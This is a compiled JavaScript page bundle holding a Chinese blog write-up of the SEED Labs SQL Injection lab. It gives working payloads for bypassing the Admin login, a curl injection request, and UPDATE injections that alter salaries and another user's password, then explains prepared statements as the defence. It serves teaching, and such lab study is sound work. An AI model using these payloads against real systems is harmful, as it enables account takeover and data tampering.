(window.webpackJsonp=window.webpackJsonp||[]).push([[44],{242:function(s,a,t){"use strict";t.r(a);var e=t(0),n=Object(e.a)({},(function(){var s=this,a=s.$createElement,t=s._self._c||a;return t("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[t("h1",{attrs:{id:"sql-injection-attack-lab"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sql-injection-attack-lab"}},[s._v("#")]),s._v(" SQL Injection Attack Lab")]),s._v(" "),t("h2",{attrs:{id:"pre-experiment"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#pre-experiment"}},[s._v("#")]),s._v(" Pre-Experiment")]),s._v(" "),t("p",[s._v("这一期的主题是 SQL 注入攻击.")]),s._v(" "),t("p",[t("a",{attrs:{href:"https://seedsecuritylabs.org/Labs_16.04/Web/Web_SQL_Injection/",target:"_blank",rel:"noopener noreferrer"}},[s._v("地址"),t("OutboundLink")],1)]),s._v(" "),t("p",[t("a",{attrs:{href:"https://seedsecuritylabs.org/Labs_16.04/PDF/Web_SQL_Injection.pdf",target:"_blank",rel:"noopener noreferrer"}},[s._v("实验指导"),t("OutboundLink")],1)]),s._v(" "),t("p",[t("a",{attrs:{href:"https://blog.csdn.net/qq_37672864/article/details/89331585",target:"_blank",rel:"noopener noreferrer"}},[s._v("参考资料"),t("OutboundLink")],1)]),s._v(" "),t("ul",[t("li",[s._v("SQL 基础")])]),s._v(" "),t("p",[s._v("虚拟机中 "),t("code",[s._v("/var/www/SQLInjection/")]),s._v(" 给出了一个 web 项目, 本地浏览器访问 "),t("code",[s._v("http://www.SEEDLabSQLInjection.com")]),s._v(".")]),s._v(" "),t("p",[s._v("同样虚拟机已经配装了 MySQL, 指令 "),t("code",[s._v("mysql -u root -pseedubuntu")]),s._v(" 可访问, 于此实验相关的数据库为 User, 库中包含表 credential.")]),s._v(" "),t("div",{staticClass:"language-SQL line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("use")]),s._v(" Users"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("show")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("tables")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" credential"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h2",{attrs:{id:"t2-sql-injection-attack-on-select-statement"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t2-sql-injection-attack-on-select-statement"}},[s._v("#")]),s._v(" T2 SQL Injection Attack on SELECT Statement")]),s._v(" "),t("p",[s._v("在登录页 (对应 "),t("code",[s._v("/var/www/SQLInjection/unsafe home.php")]),s._v(") 插入 SQL 片段来完成任务. 下面是 "),t("code",[s._v("unsafe home.php")]),s._v(" 中相关的代码片段.")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sql")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v("\"SELECT id, name, eid, salary, birth, ssn, address, email, nickname, Password\n        FROM credential\n        WHERE name= '"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$input_uname")])]),s._v("' and Password='"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$hashed_pwd")])]),s._v("'\"")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h3",{attrs:{id:"t2-1-sql-injection-attack-from-webpage"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t2-1-sql-injection-attack-from-webpage"}},[s._v("#")]),s._v(" T2.1 SQL Injection Attack from webpage")]),s._v(" "),t("p",[s._v("我们需要在登录页面的输入框中插入 SQL, 以 Admin 的身份登录.")]),s._v(" "),t("p",[s._v("经过测试, 这段 SQL 是没问题的.")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("SELECT")]),s._v(" id"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" name"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" eid"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" salary"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" birth"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" ssn"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" address"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" email"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" nickname"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" Password\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("FROM")]),s._v(" credential\n"),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("WHERE")]),s._v(" name "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Admin'")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("and")]),s._v(" Password "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("select")]),s._v(" Password "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("from")]),s._v(" credential "),t("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("where")]),s._v(" name"),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'Admin'")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("p",[s._v("如果一切顺利, 3 行 "),t("code",[s._v("Password=")]),s._v(" 后面的内容就是答案, 但是传入的密码会通过 SHA1 加密, 利用密码的位置插入 SQL 片段不太合适. 所以在用户名位置插入下面的 SQL 片段")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("Admin"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("' and Password = (select Password from credential where name='")]),s._v("Admin'"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),t("p",[s._v("最后的 "),t("code",[s._v("#")]),s._v(" 会注释掉多余的 SQL.")])]),s._v(" "),t("h3",{attrs:{id:"t2-2-sql-injection-attack-from-command-line"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t2-2-sql-injection-attack-from-command-line"}},[s._v("#")]),s._v(" T2.2 SQL Injection Attack from command line")]),s._v(" "),t("p",[s._v("这个本质和 2.1 一样, 但是它要求仿造请求完成插入, 这里使用系统携带的 curl 工具.")]),s._v(" "),t("div",{staticClass:"language-bash line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-bash"}},[t("code",[t("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'www.SeedLabSQLInjection.com//\bunsafe_home.php?username=Admin%27%20and%20Password%20%3D%20%28select%20Password%20from%20credential%20where%20name%3D%27Admin%27%29%20%23&Password=111'")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("在请求中出现的特殊字符需要转成 ASCII 的 16 进制编码, 另外 "),t("code",[s._v("www.SeedLabSQLInjection.com")]),s._v(" 后面的 "),t("code",[s._v("/")]),s._v(" 貌似需要转义.")]),s._v(" "),t("h3",{attrs:{id:"t2-3-append-a-new-sql-statement"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t2-3-append-a-new-sql-statement"}},[s._v("#")]),s._v(" T2.3 Append a new SQL statement")]),s._v(" "),t("p",[s._v("这里要求在 2.1 和 2.2 的基础上尝试一次注入两句 SQL,")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("div",{staticClass:"highlight-lines"},[t("br"),t("div",{staticClass:"highlighted"},[s._v(" ")]),t("br")]),t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[s._v("Admin"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("' and Password = (select Password from credential where name='")]),s._v("Admin"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("'); \ninsert into credential(name) values('")]),s._v("test'"),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#")]),s._v("\n")])]),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br")])]),t("p",[s._v("这里第二句是一句插入, 添加一个名为 test 的用户.")]),s._v(" "),t("p",[s._v("这个实验没有成功.")]),s._v(" "),t("h2",{attrs:{id:"t3-sql-injection-attack-on-update-statement"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t3-sql-injection-attack-on-update-statement"}},[s._v("#")]),s._v(" T3 SQL Injection Attack on UPDATE Statement")]),s._v(" "),t("p",[s._v("有 T2 的基础之后, T3 要简单的多, 主要是体验一下对数据库的修改, 相对读取数\n据, 这种 SQL 注入危害更大.")]),s._v(" "),t("p",[s._v("任务要求在用户的 Edit Profile 页面注入 SQL, "),t("code",[s._v("/var/www/SQLInjection/unsafe edit backend.php")]),s._v(" 中对应的代码片段.")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$hashed_pwd")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("sha1")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$input_pwd")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" \n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sql")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),t("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v("\"UPDATE credential SET nickname='"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$input_nickname")])]),s._v("',email='"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$input_email")])]),s._v("', address='"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$input_address")])]),s._v("', Password='"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$hashed_pwd")])]),s._v("', PhoneNumber='"),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$input_phonenumber")])]),s._v("' WHERE ID="),t("span",{pre:!0,attrs:{class:"token interpolation"}},[t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$id")])]),s._v(';"')]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$conn")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),t("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),t("span",{pre:!0,attrs:{class:"token function"}},[s._v("query")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),t("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$sql")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),t("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br"),t("span",{staticClass:"line-number"},[s._v("2")]),t("br"),t("span",{staticClass:"line-number"},[s._v("3")]),t("br")])]),t("h3",{attrs:{id:"t3-1-modify-your-own-salary"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t3-1-modify-your-own-salary"}},[s._v("#")]),s._v(" T3.1 Modify your own salary")]),s._v(" "),t("p",[s._v("修改自己的薪水, 在 phone number 输入框中输入,")]),s._v(" "),t("div",{staticClass:"language-php line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-php"}},[t("code",[t("span",{pre:!0,attrs:{class:"token single-quoted-string string"}},[s._v("', Salary='")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("50000")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("p",[s._v("不过这里要假装知道薪水对应的字段是 Salary.")]),s._v(" "),t("h3",{attrs:{id:"t3-2-modify-other-people’-salary"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t3-2-modify-other-people’-salary"}},[s._v("#")]),s._v(" T3.2 Modify other people’ salary")]),s._v(" "),t("p",[s._v("修改自己老板 Boby 的薪水, 在 phone number 中添加,")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[t("span",{pre:!0,attrs:{class:"token string"}},[s._v("', Salary='")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("1000")]),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("' where Name='")]),s._v("Boby' "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("h3",{attrs:{id:"t3-3-modify-other-people’-password"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#t3-3-modify-other-people’-password"}},[s._v("#")]),s._v(" T3.3 Modify other people’ password")]),s._v(" "),t("p",[s._v("修改老板 Boby 的密码, 进一步打击报复, 在 address 中添加")]),s._v(" "),t("div",{staticClass:"language-sql line-numbers-mode"},[t("pre",{pre:!0,attrs:{class:"language-sql"}},[t("code",[t("span",{pre:!0,attrs:{class:"token string"}},[s._v("', Password='")]),t("span",{pre:!0,attrs:{class:"token number"}},[s._v("7")]),s._v("c4a8d09ca3762af61e59520943dc26494f8941b"),t("span",{pre:!0,attrs:{class:"token string"}},[s._v("', PhoneNumber = '' where Name='")]),s._v("Boby' "),t("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#")]),s._v("\n")])]),s._v(" "),t("div",{staticClass:"line-numbers-wrapper"},[t("span",{staticClass:"line-number"},[s._v("1")]),t("br")])]),t("div",{staticClass:"custom-block tip"},[t("p",{staticClass:"custom-block-title"},[s._v("TIP")]),s._v(" "),t("p",[s._v("正如之前提到, 这里的密码要预先经过 SHA1 加密, 明文为 123456.")])]),s._v(" "),t("h2",{attrs:{id:"如何应对-sql-注入"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#如何应对-sql-注入"}},[s._v("#")]),s._v(" 如何应对 SQL 注入")]),s._v(" "),t("h3",{attrs:{id:"sql-server-做了什么"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#sql-server-做了什么"}},[s._v("#")]),s._v(" SQL Server 做了什么")]),s._v(" "),t("p",[s._v("对于 SQL Server, 一条 SQL 语句会被拆解为 SQL 部分与数据部分, 直到最后要写入数据库, SQL 语句都是用 placeholder 来占用数据所在的位置. 按顺序完成:")]),s._v(" "),t("ol",[t("li",[s._v("对 SQL 语句进行语义检查")]),s._v(" "),t("li",[s._v("将 SQL 语句中的关键字 (SELECT 等) 转成机器可执行的代码")]),s._v(" "),t("li",[s._v("优化, 选择最优操作")]),s._v(" "),t("li",[s._v("将最优的方法写入缓冲区内")]),s._v(" "),t("li",[s._v("将数据与编译完成的 SQL 绑定")]),s._v(" "),t("li",[s._v("写入")])]),s._v(" "),t("h3",{attrs:{id:"分离-sql-部分与数据部分"}},[t("a",{staticClass:"header-anchor",attrs:{href:"#分离-sql-部分与数据部分"}},[s._v("#")]),s._v(" 分离 SQL 部分与数据部分")]),s._v(" "),t("p",[s._v("利用 Prepared SQL Statement 来提前做好数据的占位, 也就是在一开始将 SQL 部分和数据部分分离, 防止数据部分危险的内容与 SQL 部分结合, 篡改本意.")])])}),[],!1,null,null,null);a.default=n.exports}}]);